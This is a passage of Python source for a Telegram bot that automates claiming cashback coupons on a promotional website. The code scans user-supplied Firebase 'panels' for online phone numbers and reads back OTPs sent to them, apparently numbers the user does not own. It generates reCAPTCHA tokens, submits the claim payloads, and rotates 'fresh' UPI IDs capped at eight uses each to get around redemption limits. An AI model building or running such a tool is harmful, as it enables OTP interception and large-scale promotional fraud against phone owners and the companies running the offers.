                    "✅ OTP verified successfully!\nNow please enter your UPI ID (e.g., name@upi):",
                    reply_markup=get_cancel_to_claim_keyboard(),
                )
                return WAITING_FOR_DIRECT_MOBILE_FLOW

            except Exception as e:
                await close_user_session(chat_id)
                await update.message.reply_text(
                    f"⚠️ Server Error: {str(e)}\nSend /claim to start a new session."
                )
                return ConversationHandler.END

        # STEP 4: UPI ID Input & Final Submission
        elif current_step == "AWAITING_UPI":
            if "@" not in text or len(text) < 5:
                await update.message.reply_text(
                    "❌ Invalid UPI ID. Please enter a valid UPI ID containing '@':",
                    reply_markup=get_cancel_to_claim_keyboard(),
                )
                return WAITING_FOR_DIRECT_MOBILE_FLOW

            session_data["upi_id"] = text
            await update.message.reply_text("⏳ Submitting final details, please wait...")

            recaptcha_token = await client.get_dynamic_token(action="submit")

            payload_step_3 = {
                "__RequestVerificationToken": session_data["dynamic_token"],
                "token": recaptcha_token,
                "curPage": "3",
                "maxPage": "3",
                "stateDropdown": session_data["state_dropdown"],
                "cityDropdown": "0",
                "branchDropdown": "0",
                "retailerDropdown": "0",
                "talukanameDropdown": "0",
                "parametersOccurance": "0",
                "CALLPANNAMEMATCH": "0",
                "MOBILE": session_data["mobile"],
                "COUPONCODE": session_data["code"],
                "STATE": session_data["state"],
                "CHECKBOX1": "on",
                "OTP": session_data["otp"],
                "REDEMPTIONTYPERADIO": "on",
                "REDEMPTIONTYPE": "10117",
                "UPIID": session_data["upi_id"],
                "CHECKBOX2": "on",
                "ChoiceAnswer": "10117_on",
            }

            try:
                res_3_json = await safe_post_json(client, API_ENDPOINT, payload_step_3)

                if res_3_json.get("token"):
                    session_data["dynamic_token"] = res_3_json["token"]

                if not res_3_json.get("error", True):
                    success_msg = res_3_json.get("messageBody") or "Process completed successfully!"

                    user_info = _extract_telegram_user_info(update)
                    await record_successful_coupon_claim({
                        "user_id": user_info["user_id"],
                        "user_name": user_info["user_name"],
                        "source": "Direct_Mobile",
                        "mobile": session_data["mobile"],
                        "coupon_code": session_data["code"],
                        "upi_id": session_data["upi_id"],
                        "status": "Claimed",
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    })

                    await update.message.reply_text(
                        f"🎉 {success_msg}\n\n"
                        "🔄 Send /claim to start a new session."
                    )
                    await close_user_session(chat_id)
                    return ConversationHandler.END
                else:
                    error_msg = res_3_json.get("messageBody") or str(res_3_json)
                    await update.message.reply_text(
                        f"❌ Website Error: {error_msg}\nPlease re-enter a valid UPI ID (or tap Cancel):",
                        reply_markup=get_cancel_to_claim_keyboard(),
                    )
                    return WAITING_FOR_DIRECT_MOBILE_FLOW

            except Exception as e:
                await close_user_session(chat_id)
                await update.message.reply_text(
                    f"⚠️ Server Error: {str(e)}\nSend /claim to start a new session."
                )
                return ConversationHandler.END

    return WAITING_FOR_DIRECT_MOBILE_FLOW


async def _run_firebase_scan_with_live_logs(
    message_target,
    raw_text: str,
    context: ContextTypes.DEFAULT_TYPE,
    is_from_file: bool,
) -> tuple[list[str], bool]:
    """
    Runs Firebase URL checking while maintaining a separate live progress message
    below the checking header, then transitions to the next step once finished.
    """
    status_msg = await message_target.reply_text(
        "⏳ **Scanning links and checking Firebase status... Please wait.**",
        parse_mode=ParseMode.MARKDOWN,
    )
    live_scan_msg = await message_target.reply_text(
        "🔄 Checking databases: 0 checked | Currently running...",
        reply_markup=get_cancel_to_claim_keyboard(),
        parse_mode=None,
    )

    checked_lines: list[str] = []
    last_live_text = live_scan_msg.text or ""

    async def _on_link_checked(done_count: int, total_count: int, item_res: dict):
        nonlocal last_live_text
        ep_short = _sanitize_plain_log_text(item_res.get("firebase_endpoint", ""))
        st_short = _sanitize_plain_log_text(item_res.get("status", ""))
        checked_lines.append(f"[{done_count}/{total_count}] {ep_short} -> {st_short}")

        live_body = (
            f"🔄 Databases checked: {done_count}/{total_count} | Running...\n"
            + "\n".join(checked_lines[-15:])
        )
        if len(live_body) > 3800:
            live_body = live_body[:3790] + "\n..."
        if live_body != last_live_text:
            last_live_text = live_body
            try:
                await live_scan_msg.edit_text(
                    live_body,
                    reply_markup=get_cancel_to_claim_keyboard(),
                    parse_mode=None,
                    disable_web_page_preview=True,
                )
            except Exception:
                pass

    try:
        reply_chunks, has_active = await process_text_data_for_bot(
            raw_text,
            context=context,
            is_from_file=is_from_file,
            link_progress_callback=_on_link_checked,
        )
    finally:
        try:
            await live_scan_msg.delete()
        except Exception:
            pass
        try:
            await status_msg.delete()
        except Exception:
            pass

    return reply_chunks, has_active


async def receive_firebase_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_text = update.message.text.strip()

    if user_text in {"Claim Coupon", "Check Coupon", "Buy Coupon", "Support", "🏆 Leaderboard"}:
        if user_text == "Claim Coupon":
            await handle_claim_coupon_menu(update, context)
            return ConversationHandler.END
        elif user_text == "Check Coupon":
            return await handle_check_coupon_menu(update, context)
        else:
            await handle_other_main_buttons(update, context)
            return ConversationHandler.END

    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    context.user_data["telegram_user_info"] = _extract_telegram_user_info(update)

    reply_chunks, has_active = await _run_firebase_scan_with_live_logs(
        message_target=update.message,
        raw_text=user_text,
        context=context,
        is_from_file=False,
    )

    for idx, chunk in enumerate(reply_chunks):
        markup = get_cancel_to_claim_keyboard() if (idx == len(reply_chunks) - 1 and not has_active) else None
        await _send_safe_long_text(
            update.message,
            chunk,
            reply_markup=markup,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True,
        )

    if has_active:
        return await _resume_or_prompt_after_active_panel(update.message, context)

    await update.message.reply_text(
        "⚠️ **No Active Firebase Panel Found.**\n"
        "🔄 Please send another **Firebase URL** or upload a **`.txt` / `.zip` file**:",
        reply_markup=get_cancel_to_claim_keyboard(),
        parse_mode=ParseMode.MARKDOWN,
    )
    return WAITING_FOR_FIREBASE_INPUT


async def receive_firebase_file_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    context.user_data["telegram_user_info"] = _extract_telegram_user_info(update)

    document = update.message.document
    file_name = (document.file_name or "").lower() if document else ""

    if not document or not (file_name.endswith(".zip") or file_name.endswith(".txt")):
        await update.message.reply_text(
            "⚠️ **Invalid File Format:** Please upload only a **`.txt`** or **`.zip`** file containing Firebase/Panel links, or paste up to 20 links directly.",
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_INPUT

    is_zip = file_name.endswith(".zip")
    file_label = "ZIP" if is_zip else "TXT"

    status_msg = await update.message.reply_text(
        f"📄 **Verifying {file_label} file:** `{document.file_name}`...\nPlease wait.",
        parse_mode=ParseMode.MARKDOWN,
    )

    temp_file_path = None
    suffix = ".zip" if is_zip else ".txt"
    has_active = False

    try:
        tg_file = await context.bot.get_file(document.file_id)
        with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
            temp_file_path = tmp.name

        await tg_file.download_to_drive(temp_file_path)

        if is_zip:
            extracted_text = await asyncio.to_thread(read_text_from_zip, temp_file_path)
        else:
            extracted_text = await asyncio.to_thread(read_text_from_txt, temp_file_path)

        if not extracted_text.strip():
            empty_msg = (
                "🚫 **Rejected ZIP:** No `.txt` link files were found inside this ZIP archive."
                if is_zip
                else "🚫 **Rejected TXT:** The uploaded `.txt` file is empty."
            )
            await status_msg.edit_text(
                empty_msg,
                reply_markup=get_cancel_to_claim_keyboard(),
                parse_mode=ParseMode.MARKDOWN,
            )
            return WAITING_FOR_FIREBASE_INPUT

        try:
            await status_msg.delete()
        except Exception:
            pass

        reply_chunks, has_active = await _run_firebase_scan_with_live_logs(
            message_target=update.message,
            raw_text=extracted_text,
            context=context,
            is_from_file=True,
        )

        for idx, chunk in enumerate(reply_chunks):
            markup = get_cancel_to_claim_keyboard() if (idx == len(reply_chunks) - 1 and not has_active) else None
            await _send_safe_long_text(
                update.message,
                chunk,
                reply_markup=markup,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True,
            )

        if has_active:
            return await _resume_or_prompt_after_active_panel(update.message, context)

        await update.message.reply_text(
            "⚠️ **No Active Firebase Panel Found.**\n"
            "🔄 Please send another **Firebase URL** or upload a **`.txt` / `.zip` file**:",
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_INPUT

    except zipfile.BadZipFile:
        await status_msg.edit_text(
            "❌ **Error:** The uploaded file is not a valid or uncorrupted ZIP archive.",
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
    except Exception as e:
        logger.error(f"{file_label} processing error: {e}")
        await status_msg.edit_text(
            f"❌ **{file_label} Read Error:** `{e}`",
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            os.remove(temp_file_path)

    return WAITING_FOR_FIREBASE_INPUT


async def receive_firebase_coupons_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Saves single or batch coupon codes submitted by the user and prompts for a fresh UPI ID."""
    user_text = update.message.text.strip()

    if user_text in {"Claim Coupon", "Check Coupon", "Buy Coupon", "Support", "🏆 Leaderboard"}:
        if user_text == "Claim Coupon":
            await handle_claim_coupon_menu(update, context)
            return ConversationHandler.END
        elif user_text == "Check Coupon":
            return await handle_check_coupon_menu(update, context)
        else:
            await handle_other_main_buttons(update, context)
            return ConversationHandler.END

    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    context.user_data["telegram_user_info"] = _extract_telegram_user_info(update)

    coupons = extract_coupon_codes_from_text(user_text)
    if not coupons:
        await update.message.reply_text(
            "❌ **No Valid Coupon Codes Found!**\n"
            "Please enter valid coupon codes (single or batch) or upload a `.txt` file:",
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_COUPONS

    context.user_data["firebase_coupons"] = coupons
    context.user_data.setdefault("used_firebase_coupons", [])

    existing_upi_cfg = context.user_data.get("firebase_upi_config")
    if existing_upi_cfg and not existing_upi_cfg.get("completed", False) and existing_upi_cfg.get("remaining_uses", 0) > 0:
        await update.message.reply_text(
            build_existing_upi_change_prompt_text(existing_upi_cfg),
            reply_markup=get_keep_existing_upi_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_UPI

    await update.message.reply_text(
        build_fresh_upi_prompt_text(len(coupons)),
        reply_markup=get_cancel_to_claim_keyboard(),
        parse_mode=ParseMode.MARKDOWN,
    )
    return WAITING_FOR_FIREBASE_UPI


async def receive_firebase_coupons_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Extracts coupon codes from an uploaded .txt file and prompts for a fresh UPI ID."""
    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    context.user_data["telegram_user_info"] = _extract_telegram_user_info(update)

    document = update.message.document
    file_name = (document.file_name or "").lower() if document else ""

    if not document or not file_name.endswith(".txt"):
        await update.message.reply_text(
            "⚠️ **Invalid File Format:** Please upload only a **`.txt`** file containing coupon codes, or paste them directly in text.",
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_COUPONS

    temp_file_path = None
    try:
        tg_file = await context.bot.get_file(document.file_id)
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as tmp:
            temp_file_path = tmp.name

        await tg_file.download_to_drive(temp_file_path)
        extracted_text = await asyncio.to_thread(read_text_from_txt, temp_file_path)

        coupons = extract_coupon_codes_from_text(extracted_text)
        if not coupons:
            await update.message.reply_text(
                "🚫 **Rejected TXT:** No valid coupon codes were found in this `.txt` file. Please upload a valid file:",
                reply_markup=get_cancel_to_claim_keyboard(),
                parse_mode=ParseMode.MARKDOWN,
            )
            return WAITING_FOR_FIREBASE_COUPONS

        context.user_data["firebase_coupons"] = coupons
        context.user_data.setdefault("used_firebase_coupons", [])

        existing_upi_cfg = context.user_data.get("firebase_upi_config")
        if existing_upi_cfg and not existing_upi_cfg.get("completed", False) and existing_upi_cfg.get("remaining_uses", 0) > 0:
            await update.message.reply_text(
                build_existing_upi_change_prompt_text(existing_upi_cfg),
                reply_markup=get_keep_existing_upi_keyboard(),
                parse_mode=ParseMode.MARKDOWN,
            )
            return WAITING_FOR_FIREBASE_UPI

        await update.message.reply_text(
            build_fresh_upi_prompt_text(len(coupons)),
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_UPI

    except Exception as e:
        logger.error(f"Coupon TXT processing error: {e}")
        await update.message.reply_text(
            f"❌ **TXT Read Error:** `{e}`",
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_COUPONS
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            os.remove(temp_file_path)


def _format_live_logs_message(status_line: str, failed_logs: list[str]) -> str:
    """Formats the separate live status & single-line failed number logs message."""
    text = f"🔄 Processing: {status_line}"
    if failed_logs:
        text += "\n" + "\n".join(failed_logs[-15:])
    if len(text) > 3800:
        text = text[:3790] + "\n..."
    return text


async def send_firebase_assigned_triplet(message_target, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Pairs an Online Number from Active Firebase panels with 1 unused coupon and
    the 8-use UPI ID, runs the automated Woohoo claim workflow, and sends the A-to-Z log.
    """
    chat_id = message_target.chat.id if getattr(message_target, "chat", None) else 0
    await cancel_running_claim_task(chat_id)

    upi_cfg = context.user_data.get("firebase_upi_config")
    if not upi_cfg or upi_cfg.get("remaining_uses", 0) <= 0:
        await message_target.reply_text(
            NEXT_NEW_UPI_PROMPT_TEXT,
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_UPI

    all_coupons: list[str] = context.user_data.get("firebase_coupons", [])
    used_coupons: list[str] = context.user_data.setdefault("used_firebase_coupons", [])
    remaining_coupons = [c for c in all_coupons if c not in used_coupons]

    if not remaining_coupons:
        await message_target.reply_text(FINAL_PNL_BATCH_COMPLETE_TEXT)
        return ConversationHandler.END

    coupon_info = pick_unused_firebase_coupon(context)
    locked_coupon = coupon_info["coupon"]
    saved_upi_id = upi_cfg["upi_id"]

    # 1. Start message (kept clean and separate from live log edits)
    await message_target.reply_text(
        f"⏳ **Auto-Claim Process Started...**\n"
        f"🎟️ **Coupon Code :** `{locked_coupon}` *(Locked until claimed)*\n"
        f"💳 **Reserved UPI:** `{saved_upi_id}` *(Auto-submitted at Step 3)*\n\n"
        "🔄 *Dispatching OTP to active online numbers and verifying via Firebase...*",
        parse_mode=ParseMode.MARKDOWN,
        disable_web_page_preview=True,
    )

    # 2. Separate live logs message with Cancel button below it
    initial_live_text = _format_live_logs_message(
        status_line="Scanning active online numbers...",
        failed_logs=[],
    )
    live_log_msg = await message_target.reply_text(
        initial_live_text,
        reply_markup=get_cancel_to_claim_keyboard(),
        parse_mode=None,
        disable_web_page_preview=True,
    )

    last_rendered_live_text = initial_live_text

    async def _on_claim_progress(status_line: str, failed_logs: list[str]):
        nonlocal last_rendered_live_text
        updated_live_text = _format_live_logs_message(
            status_line=status_line,
            failed_logs=failed_logs,
        )
        if updated_live_text != last_rendered_live_text:
            last_rendered_live_text = updated_live_text
            try:
                await live_log_msg.edit_text(
                    updated_live_text,
                    reply_markup=get_cancel_to_claim_keyboard(),
                    parse_mode=None,
                    disable_web_page_preview=True,
                )
            except Exception:
                pass

    worker_task = asyncio.create_task(
        auto_claim_triplet_on_woohoo(
            context=context,
            coupon_code=locked_coupon,
            upi_id=saved_upi_id,
            progress_callback=_on_claim_progress,
        )
    )
    active_claim_tasks[chat_id] = worker_task

    try:
        claim_result = await worker_task
    except asyncio.CancelledError:
        release_unredeemed_firebase_coupon(context, locked_coupon)
        return ConversationHandler.END
    finally:
        active_claim_tasks.pop(chat_id, None)

    if not claim_result.get("success"):
        if claim_result.get("reason") != "COUPON_INVALID":
            release_unredeemed_firebase_coupon(context, locked_coupon)
            await _send_safe_long_text(
                message_target,
                f"⚠️ **Auto-Claim Incomplete (Coupon `{locked_coupon}` has been safely preserved):**\n"
                f"📌 Reason: `{_sanitize_plain_log_text(claim_result.get('message'))[:300]}`\n\n"
                "🔄 Please send new **Active Firebase URLs** or a **`.txt` / `.zip` file** to retry this coupon:",
                reply_markup=get_cancel_to_claim_keyboard(),
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True,
            )
            return WAITING_FOR_FIREBASE_INPUT
        else:
            await _send_safe_long_text(
                message_target,
                f"❌ **Coupon Invalid / Already Used:** `{locked_coupon}`\n"
                f"📌 {_sanitize_plain_log_text(claim_result.get('message'))[:300]}\n\n"
                "👇 *Tap below to proceed with the next available coupon:*",
                reply_markup=get_firebase_triplet_keyboard(),
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True,
            )
            return WAITING_FOR_FIREBASE_UPI

    upi_slot = consume_firebase_upi_use(context)
    server_msg = claim_result.get("server_message") or "Thank you for submitting the details. Reward will be transferred to the provided UPI account within 48 hours."
    claimed_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    triplet_entry = {
        "number": claim_result["number"],
        "source_endpoint": claim_result["endpoint"],
        "otp": claim_result["otp"],
        "coupon": locked_coupon,
        "upi_id": upi_slot["upi_id"],
        "upi_use_number": upi_slot["used_count"],
        "upi_max_uses": upi_slot["max_uses"],
        "number_use_count": claim_result.get("number_use_count", 1),
        "number_max_uses": claim_result.get("number_max_uses", MAX_FIREBASE_NUMBER_USES),
        "status": "Redeemed",
        "created_at": claimed_timestamp,
    }
    context.user_data.setdefault("firebase_assigned_triplets", []).append(triplet_entry)

    user_info = context.user_data.get("telegram_user_info") or {
        "user_id": message_target.chat.id if getattr(message_target, "chat", None) else 0,
        "user_name": (
            message_target.chat.full_name
            or (f"@{message_target.chat.username}" if getattr(message_target.chat, "username", None) else f"User {message_target.chat.id}")
        ) if getattr(message_target, "chat", None) else "Unknown",
    }
    await record_successful_coupon_claim({
        "user_id": user_info["user_id"],
        "user_name": user_info["user_name"],
        "source": "Firebase_AutoClaim",
        "mobile": claim_result["number"],
        "coupon_code": locked_coupon,
        "upi_id": upi_slot["upi_id"],
        "status": "Claimed",
        "timestamp": claimed_timestamp,
    })

    atoz_log_msg = build_atoz_claim_log_text(
        triplet_entry=triplet_entry,
        upi_slot=upi_slot,
        remaining_coupons=coupon_info["remaining_total"],
        server_message=_sanitize_plain_log_text(server_msg)[:300],
    )

    if upi_slot["needs_new_upi"] or coupon_info["remaining_total"] == 0:
        await _send_safe_long_text(
            message_target,
            atoz_log_msg,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True,
        )
        await message_target.reply_text(FINAL_PNL_BATCH_COMPLETE_TEXT)
        return ConversationHandler.END

    await _send_safe_long_text(
        message_target,
        atoz_log_msg,
        reply_markup=get_firebase_triplet_keyboard(),
        parse_mode=ParseMode.MARKDOWN,
        disable_web_page_preview=True,
    )
    return WAITING_FOR_FIREBASE_UPI


async def receive_firebase_fresh_upi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Validates the user's fresh UPI ID (format and uniqueness), locks it for 8 consecutive
    uses, and immediately triggers the first Online Number + Coupon + UPI claim.
    """
    if not update.message or not update.message.text:
        return WAITING_FOR_FIREBASE_UPI

    upi_text = update.message.text.strip()

    if upi_text in {"Claim Coupon", "Check Coupon", "Buy Coupon", "Support", "🏆 Leaderboard"}:
        if upi_text == "Claim Coupon":
            await handle_claim_coupon_menu(update, context)
            return ConversationHandler.END
        elif upi_text == "Check Coupon":
            return await handle_check_coupon_menu(update, context)
        else:
            await handle_other_main_buttons(update, context)
            return ConversationHandler.END

    if not await ensure_user_subscribed(update, context):
        return ConversationHandler.END

    context.user_data["telegram_user_info"] = _extract_telegram_user_info(update)

    if not is_valid_upi_format(upi_text):
        await update.message.reply_text(
            "❌ **Invalid UPI Format**\n"
            "Please enter a valid **Fresh UPI ID** (e.g., `rahul123@ybl`, `name@okaxis`):",
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_UPI

    normalized_upi = upi_text.lower()
    used_upis: list[str] = context.user_data.setdefault("used_firebase_upis", [])
    current_cfg = context.user_data.get("firebase_upi_config")

    if normalized_upi in used_upis or (
        current_cfg and current_cfg.get("upi_id", "").lower() == normalized_upi
    ):
        await update.message.reply_text(
            "🚫 **Duplicate UPI ID Rejected**\n"
            f"`{upi_text}` has already been used.\n"
            "🔄 Please enter a **new, unused Fresh UPI ID**:",
            reply_markup=get_cancel_to_claim_keyboard(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return WAITING_FOR_FIREBASE_UPI

    used_upis.append(normalized_upi)

    upi_history: list[dict] = context.user_data.setdefault("firebase_upi_history", [])
    batch_number = len(upi_history) + 1

    new_upi_config = {
        "batch_number": batch_number,
        "upi_id": upi_text,
        "max_uses": MAX_FIREBASE_UPI_USES,
        "used_count": 0,
        "remaining_uses": MAX_FIREBASE_UPI_USES,
        "is_fresh": True,
        "locked": True,
        "completed": False,
        "added_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    context.user_data["firebase_upi_config"] = new_upi_config
    upi_history.append(new_upi_config)

    return await send_firebase_assigned_triplet(update.message, context)


# ==========================================
# 9. MAIN APPLICATION RUNNER
# ==========================================
def main():
    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE" or not BOT_TOKEN.strip():
        print("❌ Error: Please set your valid BOT_TOKEN in the script first!")
        return

    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .concurrent_updates(True)
        .post_init(on_startup)
        .post_shutdown(on_shutdown)
        .build()
    )

    claim_conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("claim", claim_command),
            CommandHandler("pnlclaim", pnlclaim_command),
            CallbackQueryHandler(
                claim_inline_callback_handler,
                pattern="^(claim_paste_firebase|claim_send_mobile|back_to_claim_menu|claim_cancel_main)$",
            ),
        ],
        states={
            WAITING_FOR_FIREBASE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_firebase_text_input),
                MessageHandler(filters.Document.ALL, receive_firebase_file_input),
                CallbackQueryHandler(
                    claim_inline_callback_handler,
                    pattern="^back_to_claim_menu$",
                ),
            ],
            WAITING_FOR_FIREBASE_COUPONS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_firebase_coupons_text),
                MessageHandler(filters.Document.ALL, receive_firebase_coupons_file),
                CallbackQueryHandler(
                    claim_inline_callback_handler,
                    pattern="^back_to_claim_menu$",
                ),
            ],
            WAITING_FOR_FIREBASE_UPI: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_firebase_fresh_upi),
                CallbackQueryHandler(
                    claim_inline_callback_handler,
                    pattern="^(fb_keep_existing_upi|fb_next_triplet|fb_retry_coupon|back_to_claim_menu)$",
                ),
            ],
            WAITING_FOR_DIRECT_MOBILE_FLOW: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_direct_mobile_flow_input),
                CallbackQueryHandler(
                    claim_inline_callback_handler,
                    pattern="^back_to_claim_menu$",
                ),
            ],
            WAITING_FOR_CHECK_COUPONS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_check_coupons_text),
                MessageHandler(filters.Document.ALL, receive_check_coupons_file),
                CallbackQueryHandler(
                    claim_inline_callback_handler,
                    pattern="^back_to_claim_menu$",
                ),
            ],
        },
        fallbacks=[
            CommandHandler("start", start_command),
            CommandHandler("claim", claim_command),
            CommandHandler("pnlclaim", pnlclaim_command),
            CallbackQueryHandler(
                claim_inline_callback_handler,
                pattern="^(back_to_claim_menu|claim_cancel_main)$",
            ),
        ],
        allow_reentry=True,
    )

    app.add_handler(claim_conv_handler)
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CallbackQueryHandler(verify_callback, pattern="^verify_join$"))
    app.add_handler(MessageHandler(filters.Regex("^Claim Coupon$"), handle_claim_coupon_menu))
    app.add_handler(MessageHandler(filters.Regex("^Check Coupon$"), handle_check_coupon_menu))
    app.add_handler(
        MessageHandler(
            filters.Regex("^(Buy Coupon|Support|🏆 Leaderboard)$"),
            handle_other_main_buttons,
        )
    )

    print("🤖 Bot is running...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
